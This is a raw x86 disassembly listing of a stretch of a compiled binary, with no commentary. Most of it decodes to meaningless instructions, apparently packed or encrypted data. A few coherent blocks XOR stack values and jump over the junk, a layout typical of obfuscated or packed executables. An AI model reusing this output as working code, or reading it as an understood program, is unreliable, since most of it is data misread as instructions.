  402139:	jmp    0x40212a
  40213b:	ds push es
  40213d:	stc    
  40213e:	dec    ebp
  40213f:	loop   0x4021b8
  402141:	lahf   
  402142:	(bad)  
  402143:	jns    0x4020db
  402145:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402146:	(bad)  
  402147:	adc    edx,edi
  402149:	mov    ebp,0xb0ffd775
  40214e:	mov    bl,0x50
  402150:	mov    eax,DWORD PTR [ebp-0x18]
  402153:	add    eax,0xaa
  402158:	jmp    0x4022f9
  40215d:	cmc    
  40215e:	dec    ebx
  40215f:	and    eax,0x7570a1be
  402164:	jno    0x402191
  402166:	push   ds
  402167:	mov    ch,0x76
  402169:	popa   
  40216a:	mov    dh,0xf0
  40216c:	nop    DWORD PTR [edx]
  40216f:	jle    0x4021ef
  402171:	cli    
  402172:	jg     0x4021f2
  402174:	jle    0x402147
  402176:	jg     0x4021d0
  402178:	mov    ds:0x6fadffe5,al
  40217d:	unpckhps xmm3,XMMWORD PTR gs:[eax-0x42681d44]
  402185:	arpl   WORD PTR [edx-0xf],cx
  402188:	cld    
  402189:	add    DWORD PTR [eax-0x6ba8737d],ebx
  40218f:	jne    0x40217d
  402191:	or     DWORD PTR [edi+0x1e],ebx
  402194:	pushf  
  402195:	shl    DWORD PTR [edx+eax*1],1
  402198:	xchg   ecx,eax
  402199:	xchg   edx,eax
  40219a:	dec    edx
  40219b:	push   ebx
  40219c:	sub    bl,BYTE PTR [edi+0xd367a85]
  4021a2:	daa    
  4021a3:	sbb    al,0x66
  4021a5:	mov    ebp,0x711d3668
  4021aa:	add    eax,0x31066422
  4021af:	imul   esi,DWORD PTR [esi+0x6f],0xc6e72e59
  4021b6:	int3   
  4021b7:	test   eax,esi
  4021b9:	ss iret 
  4021bb:	(bad)  
  4021bd:	in     eax,dx
  4021be:	cmp    al,0xb5
  4021c0:	mov    eax,0xd963426
  4021c5:	call   0xa0a13416
  4021ca:	mov    BYTE PTR [edi+0x12bd2a3b],bh
  4021d0:	jno    0x402155
  4021d2:	or     eax,0x7341dd2
  4021d7:	dec    eax
  4021d8:	or     eax,0x7d08a14
  4021dd:	retf   0xe87a
  4021e0:	or     BYTE PTR ds:0xee87668e,dl
  4021e6:	popf   
  4021e7:	push   ecx
  4021e8:	lock popf 
  4021ea:	fidivr WORD PTR [ebp-0x428ce5a4]
  4021f0:	jg     0x4021de
  4021f2:	stos   BYTE PTR es:[edi],al
  4021f3:	or     ebp,eax
  4021f5:	fsubrp st(4),st
  4021f7:	std    
  4021f8:	mov    cl,0x0
  4021fa:	ins    BYTE PTR es:[edi],dx
  4021fb:	xchg   ebp,eax
  4021fc:	dec    DWORD PTR [eax+edx*2-0x3d]
  402200:	clc    
  402201:	or     ebx,DWORD PTR [ebx+esi*1+0x156d24fe]
  402208:	ror    BYTE PTR [ebp-0x77dfc1aa],cl
  40220e:	lock adc cl,BYTE PTR [ebx-0x44419a99]
  402215:	sub    eax,0x59fe1506
  40221a:	pop    ss
  40221b:	sub    ebx,ebx
  40221d:	pop    eax
  40221e:	call   0x68d6:0x6b82164a
  402225:	sub    DWORD PTR [edi+0x5ad3f6fa],edx
  40222b:	in     al,dx
  40222c:	sub    cl,bl
  40222e:	(bad)  
  402230:	(bad)  
  402231:	mov    esi,0x6b75fc09
  402236:	sub    edx,DWORD PTR [edi-0x51]
  402239:	or     BYTE PTR [ecx+edx*2+0x669f2902],bl
  402240:	mov    esi,0xa618af3e
  402245:	and    eax,0xc6f4fbca
  40224a:	sub    DWORD PTR [edi+0x7],0xffffffb2
  40224e:	push   edi
  40224f:	nop
  402250:	add    eax,0x498b92e0
  402255:	fldenv [esi+0x6f]
  402258:	sar    BYTE PTR [edx+0x7d],0x96
  40225c:	(bad)  
  40225d:	fistp  WORD PTR [ecx-0x36819b0e]
  402263:	pushf  
  402264:	out    0x32,eax
  402266:	xor    dl,BYTE PTR [edi]
  402268:	ins    BYTE PTR es:[edi],dx
  402269:	arpl   WORD PTR [ebx],ax
  40226b:	sub    eax,0xbac7fd24
  402270:	retf   
  402271:	add    al,0xe6
  402273:	gs inc ebp
  402275:	cld    
  402276:	(bad)  [ecx]
  402278:	in     eax,dx
  402279:	jno    0x402243
  40227b:	or     DWORD PTR [esp+esi*2+0x20],edx
  40227f:	int    0x7e
  402281:	push   es
  402282:	dec    ebp
  402283:	or     ebx,DWORD PTR [ecx-0x41]
  402286:	fisubr WORD PTR [eax+ebx*4]
  402289:	adc    edi,DWORD PTR ds:0x79f2d245
  40228f:	pop    ecx
  402290:	rcl    DWORD PTR [ebx-0x12924cf8],1
  402296:	cmp    eax,0x239feecb
  40229b:	inc    edi
  40229c:	int3   
  40229d:	retf   
  40229e:	inc    ebx
  40229f:	xchg   ebp,eax
  4022a0:	sbb    eax,0x419605
  4022a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4022a6:	push   esi
  4022a7:	mov    ds:0xf3a7344a,eax
  4022ac:	fild   QWORD PTR [edx-0x49]
  4022af:	jmp    0x7dfc:0x477aec84
  4022b6:	dec    ebp
  4022b7:	pop    ebx
  4022b8:	push   es
  4022b9:	xchg   BYTE PTR [edx],al
  4022bb:	xor    bl,BYTE PTR [ecx-0x1e]
  4022be:	repnz mov al,0x1f
  4022c1:	push   edx
  4022c2:	cmp    BYTE PTR [edi+0x5a],bh
  4022c5:	out    dx,eax
  4022c6:	push   esp
  4022c7:	add    al,0x44
  4022c9:	out    dx,eax
  4022ca:	pop    ecx
  4022cb:	out    0x2b,eax
  4022cd:	xchg   esp,eax
  4022ce:	(bad)  
  4022cf:	(bad)  
  4022d0:	rol    DWORD PTR [si],cl
  4022d3:	jb     0x402295
  4022d5:	jae    0x402284
  4022d7:	loop   0x402330
  4022d9:	mov    DWORD PTR [eax-0x26f89ab3],edx
  4022df:	pop    ecx
  4022e0:	inc    esp
  4022e1:	mov    ch,0xe7
  4022e3:	es pop ds
  4022e5:	jb     0x402354
  4022e7:	and    eax,0x41697c0f
  4022ec:	(bad)  
  4022ed:	fimul  DWORD PTR [eax]
  4022ef:	xor    esi,DWORD PTR [ebp+0x49]
  4022f2:	jno    0x40233d
  4022f4:	repnz stos BYTE PTR es:[edi],al
  4022f6:	xor    eax,0x8b50d15e
  4022fb:	inc    ebp
  4022fc:	call   0x1d8a38c
  402301:	add    BYTE PTR [eax],al
  402303:	push   DWORD PTR [eax]
  402305:	call   0x40984d
  40230a:	mov    DWORD PTR [ebp-0x4],eax
  40230d:	cmp    DWORD PTR [ebp-0x4],0x0
  402311:	lea    eax,[ebp+0x4]
  402314:	mov    DWORD PTR [ebp-0x38],eax
  402317:	je     0x40313f
  40231d:	lea    eax,[ebp-0xc]
  402320:	mov    DWORD PTR [ebp-0x30],eax
  402323:	mov    eax,DWORD PTR [ebp-0x4c]
  402326:	xor    eax,esi
  402328:	add    eax,edi
  40232a:	mov    DWORD PTR [ebp-0x34],eax
  40232d:	mov    eax,DWORD PTR [ebp-0x28]
  402330:	xor    eax,esi
  402332:	add    eax,edi
  402334:	mov    DWORD PTR [ebp-0x20],eax
  402337:	mov    eax,DWORD PTR [ebp-0x4]
  40233a:	mov    DWORD PTR [ebp-0x24],eax
  40233d:	lea    eax,[ebp-0x98]
  402343:	mov    DWORD PTR [ebp-0x8],eax
  402346:	jmp    0x4024e7
  40234b:	mov    ds:0x623e7a3a,al
  402350:	bound  esp,QWORD PTR ds:[edx-0x4a]
  402354:	fadd   DWORD PTR [ebp+0x4b]
  402357:	enter  0xbe15,0x38
  40235b:	call   0x7e7f:0xfa7e7e03
  402362:	jle    0x402375
  402364:	das    
  402365:	mov    ebp,0xd2326afb
  40236a:	(bad)
  40236e:	xchg   esp,eax
  40236f:	sub    ah,BYTE PTR [ecx+0x4d]
  402372:	xchg   ebx,eax
  402373:	cwde   
  402374:	xchg   ebp,eax
  402375:	and    ebp,ecx
  402377:	sbb    eax,0xdf1fab07
  40237c:	push   esi
  40237d:	bound  esp,QWORD PTR [ebp+0x456243bc]
  402383:	shl    edi,cl
  402385:	xor    dh,BYTE PTR [eax]
  402387:	(bad)  
  402389:	(bad)  
  40238a:	push   eax
  40238b:	inc    edi
  40238c:	dec    esi
  40238d:	or     eax,0x8784a0f
  402392:	rol    BYTE PTR [ebx-0x4747d2c0],cl
  402398:	sbb    ebx,DWORD PTR [edx+esi*1-0x6aa19b4c]
  40239f:	push   es
  4023a0:	and    cl,BYTE PTR [esi-0x6c]
  4023a3:	jp     0x402356
  4023a5:	dec    ebp
  4023a6:	xor    al,al
  4023a8:	mov    edi,0x7e25cdad
  4023ad:	inc    ecx
  4023ae:	push   esi
  4023af:	xchg   DWORD PTR [edx+0x20],ecx
  4023b2:	or     ebx,DWORD PTR [ecx+ecx*8+0xbba25fd]
  4023b9:	mov    DWORD PTR [edi+0x4a1ff5b4],eax
  4023bf:	cdq    
  4023c0:	dec    dx
  4023c2:	mov    cl,0xce
  4023c4:	shl    DWORD PTR [ebp+0x302dbfb3],0xca
  4023cb:	ret    
  4023cc:	in     al,0x4b
  4023ce:	in     eax,dx
  4023cf:	rol    dl,0x9e
  4023d2:	jmp    0x402425
  4023d4:	add    BYTE PTR [edx+0x14],dh
  4023d7:	add    eax,0x61c4d81e
  4023dc:	pop    edx
  4023dd:	mov    ds:0xe3b8eb55,eax
  4023e2:	jnp    0x40242c
  4023e4:	pop    ss
  4023e5:	(bad)  
  4023e6:	pop    es
  4023e7:	mov    al,ds:0x9b7419b4
  4023ec:	mov    edi,0x203d44fd
  4023f1:	loopne 0x402444
  4023f3:	pusha  
  4023f4:	or     BYTE PTR [edi],cl
  4023f6:	jl     0x4023cf
  4023f8:	xchg   edx,eax
  4023f9:	fwait
  4023fa:	push   edx
  4023fb:	cmc    
  4023fc:	mov    dh,BYTE PTR [edx]
  4023fe:	data16 mov ch,0x6a
  402401:	push   edi
  402402:	dec    eax
  402403:	in     eax,dx
  402404:	jns    0x402386
  402406:	outs   dx,DWORD PTR ds:[esi]
  402407:	push   ss
  402408:	mov    al,ds:0xcc0594dc
  40240d:	cld    
  40240e:	cmp    edx,ebx
  402410:	cmp    bl,BYTE PTR ds:0xea60e713
  402416:	gs pop es
  402418:	mov    dl,0xeb
  40241a:	xlat   BYTE PTR ds:[ebx]
  40241b:	adc    al,0xfb
  40241d:	into   
  40241e:	arpl   sp,ax
  402420:	mov    edx,0x39e8aa5
  402425:	into   
  402426:	mov    ch,0x3
  402428:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402429:	jp     0x402417
  40242b:	ja     0x402465
  40242d:	xlat   BYTE PTR ds:[ebx]
  40242e:	xchg   esp,eax
  40242f:	push   es
  402430:	or     ah,BYTE PTR [ecx-0x4d]
  402433:	test   BYTE PTR [esi+0x5e],cl
  402436:	cs pop ebp
  402438:	gs stc 
  40243a:	inc    edi
  40243b:	or     esp,DWORD PTR [edx+eiz*4+0x1270acfe]
  402442:	lea    esi,[esi+0x7ba89ee3]
  402448:	nop    DWORD PTR [esi]
  40244b:	stos   BYTE PTR es:[edi],al
  40244c:	fcmove st,st(6)
  40244e:	fisub  DWORD PTR [ecx+0x2d]
  402451:	xor    BYTE PTR [edx+ebp*4+0x29],ch
  402455:	add    BYTE PTR [edx+0x63],dl
  402458:	sub    edx,DWORD PTR [ecx]
  40245a:	inc    edx
  40245b:	fwait
  40245c:	cmp    DWORD PTR [ebp-0x58],esp
  40245f:	and    BYTE PTR [edx+0x529d3e6a],dh
  402465:	(bad)  
  402466:	into   
  402467:	cs (bad) 
  402469:	mul    BYTE PTR [ebx-0x1853242f]
  40246f:	popa   
  402470:	mov    edi,0xef384a78
  402475:	lods   al,BYTE PTR ds:[esi]
  402476:	shr    BYTE PTR [edx-0x6e],cl
  402479:	repz xor BYTE PTR [edi],cl
  40247c:	arpl   WORD PTR [edx],bp
  40247e:	stos   BYTE PTR es:[edi],al
  40247f:	and    eax,0x44129395
  402484:	xchg   esi,eax
  402485:	cmp    bh,al
  402487:	mov    eax,0x3bf34a70
  40248c:	int3   
  40248d:	jb     0x402418
  40248f:	lea    ebp,[edi+eiz*1-0x3171b4fc]
  402496:	xchg   DWORD PTR [di-0x16cb],edx
  40249b:	dec    eax
  40249c:	out    0xc1,eax
  40249e:	outs   dx,DWORD PTR fs:[esi]
  4024a0:	mov    ds:0xbf378eed,al
  4024a5:	pushf  
  4024a6:	push   edx
  4024a7:	cli    
  4024a8:	push   ds
  4024a9:	xchg   ecx,eax
  4024aa:	data16 daa 
  4024ac:	pop    ecx
  4024ad:	push   eax
  4024ae:	dec    ecx
  4024af:	sub    bh,dh
  4024b1:	jecxz  0x4024c8
  4024b3:	mov    cl,cl
  4024b5:	loop   0x4024d7
  4024b7:	xchg   ebx,eax
  4024b8:	add    eax,0xf452d6b
  4024bd:	pminub mm4,mm4
  4024c0:	mov    WORD PTR [ebx+0x7f9cc054],?
  4024c6:	test   DWORD PTR [ebp-0x71],edi
  4024c9:	mov    dl,0xfd
  4024cb:	lock mov eax,0x9c77474d
  4024d1:	mov    edx,0x75eb7291
  4024d6:	jp     0x40254b
  4024d8:	jg     0x40247f
  4024da:	push   edi
  4024db:	arpl   WORD PTR [eax+0x3e],bp
  4024de:	int    0x24
  4024e0:	pop    edi
  4024e1:	repnz mov ecx,0x23c29337
  4024e7:	mov    eax,DWORD PTR [ebp-0x10]
  4024ea:	mov    DWORD PTR [ebp-0x10],eax
  4024ed:	mov    eax,DWORD PTR [ebp-0x1c]
  4024f0:	mov    DWORD PTR [ebp-0x40],ebx
  4024f3:	mov    DWORD PTR [ebp-0x2c],eax
  4024f6:	mov    eax,DWORD PTR [ebp-0x40]
  4024f9:	mov    ecx,DWORD PTR [ebp-0x8]
  4024fc:	jmp    0x40269d
  402501:	push   ebp
  402502:	shl    BYTE PTR [ebp+0x7159b138],1
  402508:	push   ecx
  402509:	stos   DWORD PTR es:[edi],eax
  40250a:	rol    eax,0x47
  40250d:	stos   DWORD PTR es:[edi],eax
  40250e:	dec    edi
  40250f:	iret   
  402510:	mov    fs,WORD PTR [esi]
  402512:	add    DWORD PTR [esi+0x7e],edi
  402515:	cli    
  402516:	jg     0x402596
  402518:	jle    0x402588
  40251a:	mov    dh,0x54
  40251c:	enter  0xac0b,0xc3
  402520:	sub    esi,DWORD PTR [ecx-0x40c4f017]
  402526:	call   0x88f7:0x40db3e21
  40252d:	jl     0x40255d
  40252f:	daa    
  402530:	das    
  402531:	(bad)  [edx+0x779e960a]
  402537:	ss xor eax,0x6c336412
  40253d:	bound  edx,QWORD PTR [ebp-0x1b]
  402540:	xor    al,0xa4
  402542:	or     eax,0x4af1a0e1
  402547:	aam    0xc6
  402549:	xor    DWORD PTR [edx+0xbb0c5fc],ebx
  40254f:	pop    eax
  402550:	mov    al,ah
  402552:	sub    edx,DWORD PTR [ebx+0x1f09db37]
  402558:	pop    edx
  402559:	adc    dl,ch
  40255b:	lods   eax,DWORD PTR ds:[esi]
  40255c:	lock ins BYTE PTR es:[edi],dx
  40255e:	sbb    DWORD PTR fs:[ebx-0x12],0xffffffdf
  402563:	xor    al,0xfd
  402565:	add    BYTE PTR [edx],cl
  402567:	clc    
  402568:	test   DWORD PTR [ecx+0x16],esi
  40256b:	add    eax,esi
  40256d:	das    
  40256e:	int    0xaa
  402570:	jns    0x402534
  402572:	sahf   
  402573:	push   edx
  402574:	inc    edi
  402575:	mov    esi,0x73cbb7e6
  40257a:	pop    esp
  40257b:	and    al,0xd3
  40257d:	aaa    
  40257e:	pop    ebp
  40257f:	arpl   bp,si
  402581:	or     dl,bh
  402583:	loop   0x40259f
  402585:	aas    
  402586:	lods   al,BYTE PTR ds:[esi]
  402587:	mov    WORD PTR [ebp+0x66],fs
  40258a:	push   0x44
  40258c:	test   eax,0x9e405c1
  402591:	rcr    BYTE PTR [esi],1
  402593:	inc    edi
  402594:	xchg   ecx,eax
  402595:	mov    edx,0xe0e2332d
  40259a:	je     0x402553
  40259c:	xchg   esp,eax
  40259d:	jno    0x402559
  40259f:	sbb    DWORD PTR ds:0x4265e791,ebp
  4025a5:	mov    ds,eax
  4025a7:	fs pop ecx
  4025a9:	mov    edx,0x73cad179
  4025ae:	and    ebp,DWORD PTR [ecx]
  4025b0:	sbb    DWORD PTR [ebx-0x8],eax
  4025b3:	lods   eax,DWORD PTR ds:[esi]
  4025b4:	dec    esi
  4025b5:	sti    
  4025b6:	rcr    BYTE PTR [ecx-0x4271e3ad],cl
  4025bc:	jmp    0xdbb5:0xe0090b7d
  4025c3:	hlt    
  4025c4:	dec    edi
  4025c5:	retf   0xd8a4
  4025c8:	sub    BYTE PTR [ebp-0x7deed11f],cl
  4025ce:	mov    dh,0x45
  4025d0:	and    al,0xdf
  4025d2:	fwait
  4025d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4025d4:	jle    0x40256f
  4025d6:	xchg   ebx,esp
  4025d8:	fisttp DWORD PTR [ebp-0x48]
  4025db:	fstp   DWORD PTR [ebx]
  4025dd:	xor    bl,BYTE PTR [ebx]
  4025df:	xor    al,0x5
  4025e1:	sub    esi,ebp
  4025e3:	lock jnp 0x402622
  4025e6:	push   ebp
  4025e7:	nop
  4025e8:	xor    ebx,DWORD PTR [ebp+ebp*1-0xe]
  4025ec:	mov    dh,0xd
  4025ee:	xchg   edi,eax
  4025ef:	bound  esp,QWORD PTR [ecx-0x4580f4fd]
  4025f5:	(bad)  
  4025f6:	sub    BYTE PTR [ebx-0x2dcd7298],ch
  4025fc:	mov    ecx,0xfec65964
  402601:	jne    0x402613
  402603:	icebp  
  402604:	aas    
  402605:	in     eax,0xf5
  402607:	mov    eax,0xdd9897d1
  40260c:	mov    ds:0x1f3f1e53,eax
  402611:	push   esp
  402612:	mov    esi,0x773de177
  402617:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402618:	mov    eax,ds:0x70ad830
  40261d:	mov    ebx,0xc83c05de
  402622:	dec    esp
  402623:	pop    ds
  402624:	ins    DWORD PTR es:[edi],dx
  402625:	add    edi,DWORD PTR [ebx+0x2accd4fd]
  40262b:	lods   al,BYTE PTR ds:[esi]
  40262c:	dec    ecx
  40262d:	call   0x5849331e
  402632:	retf   0x47e3
  402635:	xor    esi,esp
  402637:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402638:	push   edi
  402639:	not    DWORD PTR [edx+0x655f6b8c]
  40263f:	inc    edi
  402640:	inc    esp
  402641:	sbb    edi,DWORD PTR [edx-0x48776d07]
  402647:	repz jne 0x17b09674
  40264e:	ss xor ebp,ebx
  402651:	lea    esi,[ecx+0x67]
  402654:	inc    BYTE PTR [edi-0x317951c1]
  40265a:	jo     0x402601
  40265c:	xchg   edx,eax
  40265d:	jae    0x402653
  40265f:	pop    ss
  402660:	or     al,0x78
  402662:	jp     0x402614
  402664:	pop    ebx
  402665:	lock mov BYTE PTR [ebp-0x5e1cd779],cl
  40266c:	lods   eax,DWORD PTR ds:[esi]
  40266d:	xchg   ebx,eax
  40266e:	cld    
  40266f:	in     al,dx
  402670:	xchg   ecx,eax
  402671:	in     eax,0xe3
  402673:	repz sbb edi,DWORD PTR [esi+0x7d]
  402677:	push   esp
  402678:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402679:	cmp    DWORD PTR [eax+0x16],ebx
  40267c:	dec    ebx
  40267d:	mov    ds:0x7ca70516,al
  402682:	mov    bl,0x2d
  402684:	sub    BYTE PTR [eax+0x66f9425a],dh
  40268a:	pop    ebp
  40268b:	shl    BYTE PTR [esi-0xa],cl
  40268e:	mov    bl,0x3
  402690:	loop   0x4026ef
  402692:	lahf   
  402693:	adc    eax,edx
  402695:	mov    bh,0x87
  402697:	dec    ecx
  402698:	ins    DWORD PTR es:[edi],dx
  402699:	popf   
  40269a:	das    
  40269b:	repz lea esi,[ebx]
  40269e:	mov    BYTE PTR ds:0x32729b,0x89
  4026a5:	add    DWORD PTR [ebx+0x4d8bdc45],ecx
  4026ab:	clc    
  4026ac:	mov    DWORD PTR [ecx+0x4],eax
  4026af:	mov    eax,DWORD PTR [ebp-0x20]
  4026b2:	mov    ecx,DWORD PTR [ebp-0x8]
  4026b5:	mov    DWORD PTR [ecx+0x8],eax
  4026b8:	mov    eax,DWORD PTR [ebp-0x34]
  4026bb:	mov    ecx,DWORD PTR [ebp-0x8]
  4026be:	mov    DWORD PTR [ecx+0xc],eax
  4026c1:	jmp    0x402862
  4026c6:	les    ecx,FWORD PTR [eax+0x5552d502]
  4026cc:	ror    DWORD PTR [ecx-0x7d59e5d1],1
  4026d2:	retf   
  4026d3:	fs push esp
  4026d5:	mov    ds:0x7e7e0ea2,al
  4026da:	cli    
  4026db:	jg     0x40275b
  4026dd:	jle    0x4026ca
  4026df:	mov    ds:0x5c2d06ea,eax
  4026e4:	int    0x8c
  4026e6:	adc    BYTE PTR [ebp-0x6d427649],ch
  4026ec:	or     al,0x91
  4026ee:	cmp    al,0xd8
  4026f0:	jl     0x4026c0
  4026f2:	loope  0x4026af
  4026f4:	ss mov al,0x88
  4026f7:	aad    0xc9
  4026f9:	mov    cl,dh
  4026fb:	xor    ch,dh
  4026fd:	imul   ebp,eax,0xffffffe2
  402700:	sub    ebx,DWORD PTR [ebx]
  402702:	adc    bl,ch
  402704:	rol    DWORD PTR [edi+esi*8-0x55be46e6],1
  40270b:	cmp    DWORD PTR [ebx-0x3c],edi
  40270e:	idiv   edx
  402710:	mov    al,ds:0x3acf57b0
  402715:	mov    eax,ds:0xeb3e9239
  40271a:	stos   DWORD PTR es:[edi],eax
  40271b:	xor    ecx,esp
  40271d:	adc    BYTE PTR [edi],ah
  40271f:	or     al,0xab
  402721:	adc    edx,DWORD PTR [ebx]
  402723:	inc    ebx
  402724:	add    DWORD PTR [ebp+0x4745a73e],ebx
  40272a:	adc    eax,0x2f5bb1c7
  40272f:	int3   
  402730:	inc    esp
  402731:	sub    eax,0xd8e8d941
  402736:	mov    ecx,0xe86ed83f
  40273b:	push   ecx
  40273c:	cmp    WORD PTR [ebx-0x35],sp
  402740:	push   edi
  402741:	bound  eax,QWORD PTR [ebx+edi*8+0x5f]
  402745:	daa    
  402746:	sbb    al,BYTE PTR [edx-0x51a87025]
  40274c:	int    0xd6
  40274e:	pop    es
  40274f:	neg    ah
  402751:	sub    edx,DWORD PTR [edx-0x4f]
  402754:	sbb    BYTE PTR [ebx+ebx*8+0x19be9633],0x81
  40275c:	sbb    al,0x7
  40275e:	jecxz  0x4026f0
  402760:	mov    ds:0x92bac483,al
  402765:	mov    eax,ds:0xef219e7
  40276a:	cmp    BYTE PTR [edi],cl
  40276c:	jno    0x4027ec
  40276e:	pusha  
  40276f:	add    eax,0x38014bb5
  402774:	dec    esp
  402775:	inc    esp
  402776:	mov    esi,0x6cac5ad4
  40277b:	popf   
  40277c:	and    DWORD PTR [edi],edi
  40277e:	mov    cl,0x32
  402780:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402781:	jne    0x4027d2
  402783:	aam    0x5e
  402785:	sbb    dl,BYTE PTR [ecx]
  402787:	pop    eax
  402788:	sbb    al,0xd1
  40278a:	aas    
  40278b:	xor    DWORD PTR [ebp+0x51],esi
  40278e:	and    ebp,ebx
  402790:	(bad)  
  402791:	add    cl,dl
  402793:	mov    ah,0xa7
  402795:	fdiv   DWORD PTR [ecx+edx*8]
  402798:	scas   eax,DWORD PTR es:[edi]
  402799:	clc    
  40279a:	daa    
  40279b:	pop    edi
  40279c:	adc    esp,DWORD PTR [ebx-0x38]
  40279f:	and    eax,0x11134437
  4027a4:	fldenv [eax]
  4027a6:	mov    edi,ds
  4027a8:	and    eax,0xc0cf8233
  4027ad:	pop    es
  4027ae:	adc    BYTE PTR [eax+0x61],cl
  4027b1:	(bad)  
  4027b2:	out    dx,al
  4027b3:	jno    0x402785
  4027b5:	mov    esp,0x1ad9f0af
  4027ba:	add    esp,ebp
  4027bc:	cli    
  4027bd:	xor    eax,0x8333bda9
  4027c2:	adc    BYTE PTR [edi-0x576267c0],ah
  4027c8:	cs push 0x7f767a1a
  4027ce:	(bad)  
  4027cf:	rcl    BYTE PTR [ebx],0x3
  4027d2:	lahf   
  4027d3:	shl    edi,0xe
  4027d6:	js     0x402827
  4027d8:	cmp    DWORD PTR [esi+ebp*2],esp
  4027db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4027dc:	pop    es
  4027dd:	mov    ds:0x99c6bb6d,eax
  4027e2:	xchg   edi,eax
  4027e3:	pop    es
  4027e4:	test   al,0xb1
  4027e6:	push   edx
  4027e7:	retf   
  4027e8:	mov    edi,0x7a28183a
  4027ed:	xchg   BYTE PTR [eax],ah
  4027ef:	inc    edi
  4027f0:	pop    ebp
  4027f1:	xchg   edi,eax
  4027f2:	jno    0x402781
  4027f4:	inc    ecx
  4027f5:	dec    edx
  4027f6:	ds xchg esp,eax
  4027f8:	xchg   ecx,eax
  4027f9:	cmp    dl,BYTE PTR [esi-0x26]
  4027fc:	adc    ch,dl
  4027fe:	dec    ecx
  4027ff:	sti    
  402800:	mov    ebp,0xfa9918cd
  402805:	lahf   
  402806:	and    BYTE PTR [ecx-0x590d896d],0xb2
  40280d:	pusha  
  40280e:	fs inc eax
  402810:	xlat   BYTE PTR ds:[ebx]
  402811:	popa   
  402812:	test   al,0x24
  402814:	dec    esi
  402815:	add    al,0xa6
  402817:	or     ecx,DWORD PTR [ecx]
  402819:	call   0xe760:0xd330d81f
  402820:	cmp    al,0xc8
  402822:	jno    0x4027b8
  402824:	push   ecx
  402825:	mov    cl,0x6c
  402827:	xchg   ebp,eax
  402828:	cmp    DWORD PTR [esi-0x70a88557],eax
  40282e:	lods   al,BYTE PTR ds:[esi]
  40282f:	jns    0x40285a
  402831:	sub    eax,0x3c44689e
  402836:	pop    ebx
  402837:	inc    eax
  402838:	iret   
  402839:	mov    DWORD PTR [ecx-0x2a],ecx
  40283c:	mov    ds:0xbdbba4e7,al
  402841:	dec    esi
  402842:	xchg   ebx,eax
  402843:	out    dx,eax
  402844:	lea    ebx,[esi-0x3e0da7e8]
  40284a:	xchg   edi,eax
  40284b:	outs   dx,DWORD PTR ds:[esi]
  40284c:	xlat   BYTE PTR ds:[ebx]
  40284d:	push   esi
  40284e:	push   es
  40284f:	call   0xca4da1c3
  402854:	stos   BYTE PTR es:[edi],al
  402855:	add    al,0x22
  402857:	in     al,dx
  402858:	dec    ebx
  402859:	adc    ch,0x27
  40285c:	aam    0x7d
  40285e:	mov    esi,0x8b519897
  402863:	inc    ebp
  402864:	ror    BYTE PTR [ebx+0x4189f84d],1
  40286a:	adc    BYTE PTR [ebx-0x23ba7440],cl
  402870:	test   eax,eax
  402872:	jmp    0x402a13
  402877:	inc    edi
  402878:	push   eax
  402879:	jnp    0x402883
  40287b:	or     DWORD PTR [ecx+0x55],edx
  40287e:	push   ecx
  40287f:	adc    BYTE PTR [ebx],ch
  402881:	nop
  402882:	dec    esp
  402883:	retf   0xa8ed
  402886:	std    
  402887:	cs or  al,0x7e
  40288a:	jle    0x402886
  40288c:	jg     0x40290c
  40288e:	jle    0x4028ec
  402890:	enter  0x945f,0x64
  402894:	scas   eax,DWORD PTR es:[edi]
  402895:	sub    dh,BYTE PTR [edx]
  402897:	add    al,0x81
  402899:	clc    
  40289a:	sub    BYTE PTR [eax+0x5b5a4b72],al
  4028a0:	xor    eax,0xb0534b77
  4028a5:	sub    BYTE PTR [ebx+eax*2-0x7e],0x68
  4028aa:	aas    
  4028ab:	dec    esi
  4028ac:	pushf  
  4028ad:	gs stc 
  4028af:	es pop eax
  4028b1:	add    DWORD PTR [ecx+0x26],ebp
  4028b4:	(bad)  
  4028b5:	packsswb mm5,QWORD PTR [ebp+0x56]
  4028b9:	(bad)  
  4028ba:	sti    
  4028bb:	and    al,0x39
  4028bd:	mov    edi,0x8917f8b1
  4028c2:	xchg   edx,eax
  4028c3:	inc    ebp
  4028c4:	inc    edi
  4028c5:	clc    
  4028c6:	pop    edi
  4028c7:	jecxz  0x402872
  4028c9:	pop    edx
  4028ca:	inc    esi
  4028cb:	popf   
  4028cc:	pop    eax
  4028cd:	adc    eax,0xa2c5d76
  4028d2:	jb     0x402914
  4028d4:	xchg   edi,eax
  4028d5:	rol    al,cl
  4028d7:	lahf   
  4028d8:	inc    ecx
  4028d9:	push   esi
  4028da:	rcl    BYTE PTR [ecx+0x4057344a],0x2f
  4028e1:	adc    al,BYTE PTR ds:0x7a7c79c4
  4028e7:	cmc    
  4028e8:	mov    WORD PTR [ebx+0x6],ss
  4028eb:	cld    
  4028ec:	jo     0x4028d7
  4028ee:	jmp    0xdf1090f3
  4028f3:	pop    ecx
  4028f4:	and    al,0x94
  4028f6:	addr16 mov al,ds:0x45b9
  4028fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4028fb:	js     0x4028cc
  4028fd:	jb     0x402887
  4028ff:	xchg   ebx,eax
  402900:	mov    ebx,0xbf80a348
  402905:	pop    eax
  402906:	arpl   WORD PTR [esi-0x1c],cx
  402909:	push   ecx
  40290a:	xchg   esp,eax
  40290b:	dec    ecx
  40290c:	add    edx,DWORD PTR [ebp-0x180fc6d1]
  402912:	test   al,0xa6
  402914:	mov    ah,0xfb
  402916:	push   edi
  402917:	rol    ebx,0xa
  40291a:	sub    DWORD PTR [edx-0x3b],edx
  40291d:	shr    BYTE PTR [ecx-0x61569759],0x14
  402924:	pusha  
  402925:	inc    ebx
  402926:	dec    esi
  402927:	std    
  402928:	pop    ss
  402929:	xor    cl,BYTE PTR cs:[eax+0x2d]
  40292d:	and    al,0xba
  40292f:	mov    es,WORD PTR [ebx+0x8dd7ead]
  402935:	inc    edi
  402936:	pop    eax
  402937:	outs   dx,BYTE PTR ds:[esi]
